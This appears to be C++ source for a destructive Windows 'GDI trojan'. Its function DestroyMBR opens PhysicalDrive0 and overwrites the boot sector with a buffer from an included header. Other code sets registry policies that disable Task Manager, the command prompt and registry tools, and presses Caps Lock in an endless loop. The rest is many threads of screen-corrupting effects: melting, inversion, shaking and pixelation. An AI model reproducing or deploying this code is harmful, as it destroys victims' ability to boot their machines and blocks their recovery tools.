#include <windows.h>
#include "BootRecord.h"
#define BITMAPINFO_SIZE sizeof(BITMAPINFO)

void SendKeyboardInput(INPUT inputs, WORD wKey, int Milliseconds) {
	inputs.type = INPUT_KEYBOARD;
	inputs.ki.wVk = wKey;
	SendInput(1, &inputs, sizeof(INPUT));
	ZeroMemory(&inputs, sizeof(INPUT));
	Sleep(Milliseconds);
	inputs.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &inputs, sizeof(INPUT));
	ZeroMemory(&inputs, sizeof(INPUT));
	Sleep(Milliseconds);
}

namespace Inputs {
	DWORD CALLBACK KeyboardInputs(LPVOID pvoid) {
		INPUT ipt;
		while (true) {
			SendKeyboardInput(ipt, VK_CAPITAL, 500);
		}
		return 0;
	}
}

VOID regAdd(HKEY hk, LPCWSTR lpsub, LPCWSTR lpval, DWORD dwtype, UINT val) {
	HKEY hky;
	DWORD dwd;
	long res;
	
	res = RegCreateKeyExW(hk, lpsub, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hky, &dwd);
	res = RegSetValueExW(hk, lpval, 0, dwtype, (const PBYTE)&val, (int)sizeof(val));
	
	RegCloseKey(hky);
	return;
}

namespace Registry {
	void SystemDisabler() {
		regAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\SYSTEM", L"DisableTaskMgr", REG_DWORD, 1);
		regAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 2);
		regAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\SYSTEM", L"DisableRegistrytools", REG_DWORD, 1);
	}
}

namespace BootSector {
	void DestroyMBR() {
		DWORD dwbytes;
		HANDLE hSctr = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hSctr == INVALID_HANDLE_VALUE) {
			MessageBoxW(NULL, L"Opening physical drive failed!", L"Error", MB_ICONERROR);
			CloseHandle(hSctr);
			exit(0);
		}
		if (!WriteFile(hSctr, Buffer, 32768, &dwbytes, NULL)) {
			MessageBoxW(NULL, L"Overwriting boot sector failed!", L"Error", MB_ICONERROR);
			CloseHandle(hSctr);
			exit(0);
		}
	}
}

namespace GDIEffects {
	DWORD WINAPI DarkPixelation(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
			BITMAPINFO bmp = { { sizeof(BITMAPINFO), w, h, 1, 32, BI_RGB }, 0 };
			BLENDFUNCTION ftn = { AC_SRC_OVER, 0, 10, 0 };
			HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
			SelectObject(mdc, hbit);
			int wPixel = w/10, hPixel = h/10;
			StretchBlt(mdc, rand() % 1, rand() % 1, wPixel, hPixel, hdc, rand() % -1, rand() % -1, w, h, SRCCOPY);
			AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, wPixel, hPixel, ftn);
			ReleaseDC(0, hdc);
			Sleep(1000);
		}
	}
	
	DWORD WINAPI InitialRGBTriple(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
			BITMAPINFO bmp = { { 40, w, h, 1, 24}, 0 };
			RGBTRIPLE* rgbt;
			HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (LPVOID*)&rgbt, NULL, 0);
			SelectObject(mdc, hbit);
			for (;;) {
				BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCERASE);
				for (int t = 0; t < w * h; t++) {
					int x = t % w, y = t / h;
					rgbt[t].rgbtRed += x&y;
					rgbt[t].rgbtGreen += x;
					rgbt[t].rgbtBlue += x;
				}
				BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCERASE);
				BitBlt(hdc, rand() % 30, rand() % 30, w, h, hdc, rand() % 30, rand() % 30, SRCCOPY);
				SelectObject(hdc, CreateSolidBrush(RGB(100, 100, 100)));
				PatBlt(hdc, 0, 0, w, h, PATINVERT);
				SelectObject(hdc, GetStockObject(NULL_BRUSH));
				Sleep(10);
			}
		}
	}
	
	DWORD WINAPI ClipRects(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			int rw = rand() % w, rh = rand() % h;
			HRGN rgn = CreateRectRgn(rw, rh, rw+400, rh+400);
			SelectClipRgn(hdc, rgn);
			SelectObject(hdc, CreateSolidBrush(RGB(100, 100, 100)));
			BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI ScreenFlip(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			StretchBlt(hdc, 0, 0, w, h, hdc, w, 0, -w, h, SRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI ModdedRectBounce(LPVOID pvoid)
	{
		HDC hdc;
		HBRUSH hbsh;
		int sx = 5, sy = 10, sx1 = 1, sy1 = 1;
		int incrementation = 5;
		int x = 30, y = 10;
		while (1) {
			hdc = GetDC(0);
			x += incrementation * sx;
			y += incrementation * sy;
			hbsh = CreateSolidBrush(crSpectrum(fclr));
			SelectObject(hdc, hbsh);
			Rectangle(hdc, x, y, x+100, y+100);
			if (y >= GetSystemMetrics(1)) {
				sy = -1;
			}
			if (x >= GetSystemMetrics(0)) {
				sx = -1;
			}
			if (y == 0) {
				sy = 5;
			}
			if (x == 0) {
				sx = 10;
			}
			fclr += M_PI;
			DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI XorRgbShake(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			for (int X = 0; X <= w; X++) {
				for (int Y = 0; Y <= h; Y++) {
					HBRUSH hbsh = CreateSolidBrush(RGB(X^Y, X^Y, X^Y));
					SelectObject(hdc, hbsh);
					BitBlt(hdc, rand() % 15, rand() % 15, w, h, hdc, rand() % 15, rand() % 15, SRCCOPY);
					PatBlt(hdc, 0, 0, w, h, PATINVERT);
				}
			}
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI OverlayRgbquad(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
			BITMAPINFO bmp = { { sizeof(BITMAPINFO), w, h, 1, 32 }, 0 };
			PTRGBQUAD rgbq;
			HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (LPVOID*)&rgbq, NULL, 0);
			SelectObject(mdc, hbit);
			for (;;) {
				BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
				for (int t = 0; t < w * h; t++) {
					int x = t % w, y = t / w;
					rgbq[t].red += x&y;
				}
				BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
				Sleep(10);
			}
		}
	}
	
	DWORD WINAPI AngledBitBlt(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			if (rand() % 2 == 0) {
				BitBlt(hdc, 2, 2, w+4, h+4, hdc, 0, 0, SRCCOPY);
			}
			else if (rand() % 2 == 1) {
				BitBlt(hdc, -4, -4, w-8, h-8, hdc, 0, 0, SRCCOPY);
			}
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI SplitBltAnd(LPVOID pvoid)
	{
		HDC hdc;
		while (true) {
			hdc = GetDC(0);
			SplitBlt(hdc, 5, w, h, SRCAND);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI JPEGCompression(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			HBRUSH hbsh = CreateSolidBrush(RGB(150, 150, 150));
			SelectObject(hdc, hbsh);
			BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, MERGECOPY);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI SplitBltOr(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			SplitBlt(hdc, 5, w, h, SRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI SolarisMelting(LPVOID pvoid)
	{
		while (true) {
			CreateThread(NULL, 0, ContextRedraw, NULL, 0, 0);
			HDC hdc = GetDC(0);
			int rw = rand() % w;
			BitBlt(hdc, rw, rand() % 20 - 10, 100, h, hdc, rw, 0, SRCAND);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI ArcSpectrum(LPVOID pvoid)
	{
		HDC hdc;
		HPEN hp;
		int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
		int incrementation = 5;
		int x = 10, y = 10;
		while (1) {
			hdc = GetDC(0);
			x += incrementation * sx;
			y += incrementation * sy;
			hp = CreatePen(PS_SOLID, 10, crSpectrum(fclr));
			SelectObject(hdc, hp);
			Arc(hdc, x, y, x+200, y+200, x+200, y+200, x+200, y+200);
			fclr += M_PI;
			if (y >= GetSystemMetrics(1)) {
				sy = -1;
			}
			if (x >= GetSystemMetrics(0)) {
				sx = -1;
			}
			if (y == 0) {
				sy = 1;
			}
			if (x == 0) {
				sx = 1;
			}
			DeleteObject(hp);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI SetShake(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			StretchBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, w, h, SRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI ScreenInvert(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(500);
		}
	}
	
	DWORD WINAPI TrigonShake1(LPVOID pvoid)
	{
	    HDC hdc;
	    float angle = 0.0;
	    int xadd, yadd; // x angle and y angle
	    while (1) {
	        hdc = GetDC(NULL);
	        xadd = cosf(angle) * 20, yadd = sinf(angle) * 20;
	        BitBlt(hdc, xadd, yadd, w, h, hdc, 0, 0, SRCCOPY);
	        angle += M_PI_4;
	        ReleaseDC(NULL, hdc);
	        Sleep(10);
	    }
	}
	
	/* DWORD WINAPI ClipEllipses(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			int rw = rand() % w, rh = rand() % h;
			HRGN rgn = CreateEllipticRgn(rw, rh, rw+((rand() % 2)?100:300), rh+((rand() % 2)?100:300));
			SelectClipRgn(hdc, rgn);
			HBRUSH hbsh = CreateSolidBrush(RGB(rand() % 239, rand() % 239, rand() % 239));
			SelectObject(hdc, hbsh);
			BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
			DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(500);
		}
	} */
	
	DWORD WINAPI PixelationDelete(LPVOID pvoid)
	{
	    HDC hdc;
	    while (true) {
	        hdc = GetDC(0);
	        HDC mdc = CreateCompatibleDC(hdc);
	        HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	        SelectObject(mdc, hbit);
	        SetStretchBltMode(hdc, STRETCH_DELETESCANS); SetStretchBltMode(mdc, STRETCH_DELETESCANS);
	        StretchBlt(mdc, 0, 0, w/10, h/10, hdc, 0, 0, w, h, SRCCOPY);
	        StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, w/10, h/10, SRCCOPY);
	        ReleaseDC(0, hdc);
	        Sleep(10);
	    }
	}
	
	DWORD WINAPI TrigonShake2(LPVOID pvoid)
	{
	    HDC hdc;
	    float angle = 0.0;
	    int xadd, yadd; // x angle and y angle
	    while (1) {
	        hdc = GetDC(NULL);
	        xadd = cosf(angle) * 10, yadd = sinf(angle) * 10;
	        BitBlt(hdc, xadd, yadd, w, h, hdc, 0, 0, SRCCOPY);
	        angle += M_PI / 6;
	        ReleaseDC(NULL, hdc);
	        Sleep(10);
	    }
	}
	
	DWORD WINAPI PixelationDelete2(LPVOID pvoid)
	{
	    HDC hdc;
	    while (true) {
	        hdc = GetDC(0);
	        HDC mdc = CreateCompatibleDC(hdc);
	        HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	        SelectObject(mdc, hbit);
	        SetStretchBltMode(hdc, STRETCH_DELETESCANS); SetStretchBltMode(mdc, STRETCH_DELETESCANS);
	        StretchBlt(mdc, 0, 0, w/4, h/4, hdc, 0, 0, w, h, SRCCOPY);
	        StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, w/4, h/4, SRCCOPY);
	        ReleaseDC(0, hdc);
	        Sleep(10);
	    }
	}
	
	DWORD WINAPI RotateScreen(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			HWND hwnd = GetDesktopWindow();
			RECT rect;
			GetWindowRect(hwnd, &rect);
			POINT lpt[3];
			int roto = 30, roto2 = 50; // Paying homage to AZreium.
			if (rand() % 2 == 0) {
				lpt[0].x = rect.left + roto; lpt[0].y = rect.top - roto;
				lpt[1].x = rect.right + roto; lpt[1].y = rect.top + roto;
				lpt[2].x = rect.left - roto; lpt[2].y = rect.bottom - roto;
				PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right-rect.left, rect.bottom-rect.top, NULL, 0, 0);
			}
			else if (rand() % 2 == 1) {
				lpt[0].x = rect.left - roto2; lpt[0].y = rect.top + roto2;
				lpt[1].x = rect.right - roto2; lpt[1].y = rect.top - roto2;
				lpt[2].x = rect.left + roto2; lpt[2].y = rect.bottom + roto2;
				PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right-rect.left, rect.bottom-rect.top, NULL, 0, 0);
			}
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI HatchPatBlt(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			HBRUSH hbsh = CreateHatchBrush(rand() % 6, RGB(rand() % 239, rand() % 239, rand() % 239)); // Cycles through all the hatch brush styles.
			SelectObject(hdc, hbsh);
			PatBlt(hdc, 0, 0, w, h, PATINVERT);
			DeleteObject(hbsh);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
	
	DWORD WINAPI VerticalRgbquad(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
			BITMAPINFO bmp = { { BITMAPINFO_SIZE, w, h, 1, 32 }, 0 };
			PTRGBQUAD rgbq;
			HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (LPVOID*)&rgbq, NULL, 0);
			SelectObject(mdc, hbit);
			for (;;) {
				BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
				for (int t = 0; t < w * h; t++) {
					int x = t % w;
					rgbq[t].blue += GetGValue(x*100);
				}
				BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
				Sleep(10);
			}
		}
	}
	
	DWORD WINAPI FinalMelt(LPVOID pvoid)
	{
		while (true) {
			HDC hdc = GetDC(0);
			int rw = rand() % w, rh = rand() % h;
			BitBlt(hdc, rw, rand() % 20 - 10, 100, h, hdc, rw, 0, SRCAND);
			BitBlt(hdc, rand() % 20 - 10, rh, w, 100, hdc, 0, rh, SRCPAINT);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
}
